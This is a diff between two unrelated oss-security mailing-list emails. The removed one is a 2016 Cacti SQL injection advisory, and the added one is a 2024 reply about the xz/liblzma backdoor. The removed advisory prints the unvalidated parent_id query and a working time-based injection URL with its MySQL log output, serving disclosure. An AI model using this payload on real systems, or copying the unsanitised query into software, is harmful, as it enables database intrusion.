@@ -1,9 +1,4 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["3318" "Thursday" "10" "March" "2016" "17:06:32" "+0100" "Paul Gevers" "elbrus@debian.org" "<56E19B88.3000908@debian.org>" "87" "[oss-security] please assign CVE for cacti bug 2667: SQL Injection Vulnerability" nil nil nil "3" "2016031016:06:32" "[oss-security] please assign CVE for cacti bug 2667: SQL Injection Vulnerability" (number mark "U       elbrus@debia Mar 10   87/3318  " thread-indent "\"[oss-security] please assign CVE for cacti bug 2667: SQL Injection Vulnerability\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	nil)
-X-Mozilla-Status: 0000
-X-Mozilla-Status2: 00000000
-Received: (qmail 30252 invoked by uid 550); 10 Mar 2016 16:06:51 -0000
+Received: (qmail 9529 invoked by uid 550); 29 Mar 2024 18:59:51 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,107 +7,82 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 30234 invoked from network); 10 Mar 2016 16:06:50 -0000
-X-Brand: 4ZrJ
-To: oss-security@lists.openwall.com
-From: Paul Gevers <elbrus@debian.org>
-X-Enigmail-Draft-Status: N1110
-Message-ID: <56E19B88.3000908@debian.org>
-Date: Thu, 10 Mar 2016 17:06:32 +0100
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101
- Icedove/38.6.0
+Received: (qmail 9488 invoked from network); 29 Mar 2024 18:59:51 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20230601; t=1711738782; x=1712343582; darn=lists.openwall.com;
+        h=content-transfer-encoding:to:subject:message-id:date:from
+         :in-reply-to:references:mime-version:from:to:cc:subject:date
+         :message-id:reply-to;
+        bh=YqQk5LnfpwA6JfmnEtzIoBVws4Tv0ZgRA8oLkEjD6/s=;
+        b=N3/VVhoZrpRPqGe99WWRffYLwp54OjBBy/reftaTAYigdN939WebPbByA8gSgkZfJQ
+         4BeXpLxH55wnl3VKUVRNgrzf4xJXcR1dj/kuByPP3XmRRG+VURP8htL0K5y3tyhU05mO
+         iHB+5QrZEgqS0HlR1DbCpuYTvcWcuKnmaM41E9KaKIRCXk+IAxmwXrvVQs1SScZhXJ6Y
+         xm/47Gxl3fEqafv8gerh/zMWHGDw84W1gH1RbPSWH7X4DZ1NNo4dFmTHlhwqbHuBIji7
+         q1h2j366CC/NdViEZVMK+Jgz/7m/hY+AXGOObN9krs/qW8drrJ1PVm5OG01t6aMeffvB
+         agGA==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20230601; t=1711738782; x=1712343582;
+        h=content-transfer-encoding:to:subject:message-id:date:from
+         :in-reply-to:references:mime-version:x-gm-message-state:from:to:cc
+         :subject:date:message-id:reply-to;
+        bh=YqQk5LnfpwA6JfmnEtzIoBVws4Tv0ZgRA8oLkEjD6/s=;
+        b=Hojg2fXw1hN7ib0r1WUX7Lf8BpA87fytG5xXD7dVN27llqEpYmvrVhlq3I5BtrZPJI
+         HVRKJeugkJxl/74CChf7p6u5t+Di4wSX4q69lOtMDDQ2Pc1dTVskKo2dyQFgSN7yclhO
+         p6512vxI1lpcZl2jdTFPsKiHrBExBQnPZSS8k7EnLugDGh13PtcGYCE1qLmA7woi5Z/Q
+         wIhI+pwRgQISgwmxLNGfm8vq4JvFYj7d9p5IdK6f6R1zAC7c29QTBLGSCaHclcfXQFv2
+         GVhxFBCkdjnsMoVo3s/0c5Y5eTqj2NKLmSSP8cRbASjzVU9EHhgGDWTC9zyZHvGGx0o3
+         fEew==
+X-Gm-Message-State: AOJu0Yz75Ww3YizEU6r4cQA6UeIHsuPlDtfz9mTIykiaZ9GMkbl87ZkG
+	g+wHmbTR++qrVJn7vRKsLEtrY8yia80ZJJsKXJPoFnCEOHRUgJREDxrIyMJuFH4YujZm2AnzsUx
+	YE5aWmgo1nm8BxDYrdTmWsTCKkSle69iFHVT/7w==
+X-Google-Smtp-Source: AGHT+IG4ttQucWVZz4DocYHPOQCN7345d8kQPNdUTCqDL1so2COIePIcIZjZTLVNdnM/qlOvuMtVVxVr5/gLM1FsMZY=
+X-Received: by 2002:a05:6102:d8c:b0:478:37c4:b20e with SMTP id
+ d12-20020a0561020d8c00b0047837c4b20emr3553830vst.20.1711738781642; Fri, 29
+ Mar 2024 11:59:41 -0700 (PDT)
 MIME-Version: 1.0
-Content-Type: multipart/signed; micalg=pgp-sha256;
- protocol="application/pgp-signature";
- boundary="Nlgjn2A2LGB1j7soPaAvt98IwUuSs3vV2"
-X-OriginalArrivalTime: 10 Mar 2016 16:06:39.0040 (UTC) FILETIME=[D4202C00:01D17AE6]
-X-RcptDomain: lists.openwall.com
-Subject: [oss-security] please assign CVE for cacti bug 2667: SQL Injection Vulnerability
-
---Nlgjn2A2LGB1j7soPaAvt98IwUuSs3vV2
-Content-Type: text/plain; charset=utf-8
+References: <20240329155126.kjjfduxw2yrlxgzm@awork3.anarazel.de>
+In-Reply-To: <20240329155126.kjjfduxw2yrlxgzm@awork3.anarazel.de>
+From: "Alexander E. Patrakov" <patrakov@gmail.com>
+Date: Sat, 30 Mar 2024 02:59:14 +0800
+Message-ID: <CAN_LGv0CU6J+5d6RX=mDrMvAg4kf3EGi+56x+J4iW0NCFRee1g@mail.gmail.com>
+To: oss-security@lists.openwall.com
+Content-Type: text/plain; charset="UTF-8"
 Content-Transfer-Encoding: quoted-printable
+Subject: Re: [oss-security] backdoor in upstream xz/liblzma leading to ssh
+ server compromise
 
-Hi
+On Sat, Mar 30, 2024 at 12:09=E2=80=AFAM Andres Freund <andres@anarazel.de>=
+ wrote:
+> =3D=3D Affected Systems =3D=3D
+>
+> The attached de-obfuscated script is invoked first after configure, where=
+ it
+> decides whether to modify the build process to inject the code.
+>
+> These conditions include...
+<snip>
+> Running as part of a debian or RPM package build:
+>     if test -f "$srcdir/debian/rules" || test "x$RPM_ARCH" =3D "xx86_64";=
+then
 
-I just found the description below about an sql vulnerability in the
-cacti bug tracker: http://bugs.cacti.net/view.php?id=3D2667
+Could you please confirm that the Arch Linux binary package was never
+actually compromised?
 
-Can a CVE be assigned for this issue?
-Thanks
+> openssh does not directly use liblzma. However debian and several other
+> distributions patch openssh to support systemd notification, and libsyste=
+md
+> does depend on lzma.
 
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D
-Advisory: Cacti SQL Injection Vulnerability
-Author: Do9gy of Tencent Security Platform Department
-Affected Version: 0.8.8.g(the latest version & the older versions)
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D
-Vulnerability Description
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D
+<snip>
 
-Recetly, I found a SQL Injection Vulnerability in =E2=80=98Cacti-0.8.8g'
-program, Cacti is widely used in many companies.
-Vulnerable file: /cacti/tree.php:
-line 208:
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
-    switch ($current_type) {
-    case TREE_ITEM_TYPE_HEADER:
-        $i =3D 0;
-        /* it's nice to default to the parent sorting style for new items */
-        if (empty($_GET["id"])) {
-            $default_sorting_type =3D db_fetch_cell("select
-sort_children_type from graph_tree_items where id=3D" . $_GET["parent_id"]);
-        }else{
-            $default_sorting_type =3D TREE_ORDERING_NONE;
-        }
+> Observed requirements for the exploit:
+> b) argv[0] needs to be /usr/sbin/sshd
 
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+I have checked, and found that Arch Linux does not apply any patches
+when building OpenSSH.
 
-The parameter parent_id is used without any validation.
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D
-POC && EXP
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D
-1. Login
+P.S. in the detect.sh script, the "set -eu" line plays a bad trick: it
+aborts the check if sshd is not actually linked to liblzma.
 
-2.
-http://target/cacti-0.8.8g/tree.php?action=3Ditem_edit&tree_id=3D2&parent_i=
-d=3D8%20and%20sleep(1)
-[^]
-
-3. mysql log: select sort_children_type from graph_tree_items where id=3D8
-and sleep(1)
-
-
-
---Nlgjn2A2LGB1j7soPaAvt98IwUuSs3vV2
-Content-Type: application/pgp-signature; name="signature.asc"
-Content-Description: OpenPGP digital signature
-Content-Disposition: attachment; filename="signature.asc"
-
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v2
-
-iQEcBAEBCAAGBQJW4ZuJAAoJEJxcmesFvXUKPdUH/1nIzNbGvbMd29Ae3SW3Tck3
-WujXAP7xb1Vo/7S/tK4fBeoRzbJQZcfNGloaDS9FLwH9JiEluJCP5eomrYfBc+Om
-qshW55pPDlVJktBBc62LV1ZWYLyrHeee3nmccKSZYAQkMp4yOyqpJwDTuCehLgFr
-0/b4ijQCPDIi0bW8NVXE+qjxPgyPRVrjEWF0OH1NwXPALT0uJgwzI4rAfM8ous3J
-ox7JWK2d3yIUWXA1nC3JJjV/ucgIF3NOXxGOKhwMpcok06PXJC2w/tKywAb8p4+3
-joDCzxC+iqQRY6vgWt+2Allxq8TS9khbs2EYb+an1PmkWe3+Jr3MHqf+BnFuexs=
-=lf80
------END PGP SIGNATURE-----
-
---Nlgjn2A2LGB1j7soPaAvt98IwUuSs3vV2--
+--=20
+Alexander E. Patrakov
